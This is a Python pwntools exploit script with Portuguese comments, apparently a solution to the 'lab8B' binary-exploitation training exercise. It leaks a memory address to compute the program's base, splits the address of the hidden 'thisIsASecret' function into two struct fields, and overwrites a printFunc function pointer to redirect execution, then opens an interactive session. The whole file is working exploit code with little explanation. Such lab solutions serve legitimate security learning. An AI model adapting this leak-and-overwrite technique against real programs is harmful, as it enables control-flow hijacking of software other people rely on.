from pwn import *
from struct import pack

h = process("./lab8B")

'''
dat = h.recv(4096)
print(hexdump(dat))
'''

h.sendline(b"1") # Escolhendo a opção 1 
h.sendline(b"1") # struct vector v1;


h.sendline(b"A")    # char
h.sendline(b"100")  # short 
h.sendline(b"400")  # unsigned short 
h.sendline(b"100")  # int
h.sendline(b"1000") # unsigned int 
h.sendline(b"10")   # long
h.sendline(b"20")   # unsigned long
h.sendline(b"400")  # long long 
h.sendline(b"450")  # unsigned long long


## Leak do endereço + calculo 
h.sendline(b"3")
h.sendline(b"1")

data = h.recvrepeat(timeout=1.5)
#print(hexdump(data))
leak_memory = int(data[1659:1669],16)
calc_base = leak_memory - 4329

calc_thisIsASecret = calc_base + 0x000010a7 
print("file base [ {} ]".format(hex(calc_base)))
print("calc function [ {} ]\n".format(hex(calc_thisIsASecret)))

struct_vector_1_unsigned_int = int(( calc_thisIsASecret  - 1 ) / 2)
struct_vector_2_unsigned_int = int( (struct_vector_1_unsigned_int + 1 ))

#testando_endereco = struct_vector_1_unsigned_int + struct_vector_2_unsigned_int
print(struct_vector_1_unsigned_int)

h.sendline(b"1") # Escolhendo a opção 1 
h.sendline(b"1") # struct vector v1;


h.sendline(b"A")    # char
h.sendline(b"100")  # short 
h.sendline(b"400")  # unsigned short 
h.sendline(b"100")  # int
h.sendline(str(struct_vector_1_unsigned_int).encode()) # unsigned int
h.sendline(b"10")   # long
h.sendline(b"20")   # unsigned long
h.sendline(b"400")  # long long 
h.sendline(b"450")  # unsigned long long


# Adicionando na struct vector 2 
h.sendline(b"1")
h.sendline(b"2") # struct vector 2;

h.sendline(b"A")    # char
h.sendline(b"100")  # short 
h.sendline(b"400")  # unsigned short 
h.sendline(b"100")  # int
h.sendline(str(struct_vector_2_unsigned_int).encode()) # unsigned int
h.sendline(b"10")   # long
h.sendline(b"80")   # unsigned long
h.sendline(b"400")  # long long 
h.sendline(b"450")  # unsigned long long

h.sendline(b"2")

### MOVENDO A ESTRUTURA PARA O PONTO CORRETO
h.sendline(b"4")
h.sendline(b"4")
h.sendline(b"4")
h.sendline(b"4")
h.sendline(b"4")
######## PARTE FINAL ########

h.sendline(b"6")
h.sendline(b"4")
h.sendline(b"1") ### MOVENDO O PONTEIRO PARA  void (*printFunc)(struct vector*);

h.sendline(b"3") ### Chamando a função void thisIsASecret();
h.sendline(b"1") #### Chamando a estrutura modificada

'''
gdb.attach(h)
pause()
'''

h.interactive()